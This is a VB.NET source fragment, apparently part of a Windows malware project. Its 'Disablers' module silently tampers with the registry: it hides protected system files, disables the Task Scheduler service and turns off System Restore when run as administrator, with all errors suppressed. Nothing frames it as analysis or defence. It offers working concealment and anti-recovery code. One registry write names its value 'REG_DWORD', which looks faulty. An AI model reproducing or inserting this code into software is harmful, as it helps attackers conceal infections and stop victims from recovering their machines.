Imports System.Security.Principal
Imports Microsoft.Win32
Imports System.Security.AccessControl

Module Disablers
    Public Sub Disable()
        On Error Resume Next
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden", "0", Microsoft.Win32.RegistryValueKind.DWord)
        If IsAdmin() Then
            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Script Host\Settings", "REG_DWORD", "1", Microsoft.Win32.RegistryValueKind.DWord)
            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule", "Start", "4", Microsoft.Win32.RegistryValueKind.DWord)
            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)

        End If
    End Sub
End Module
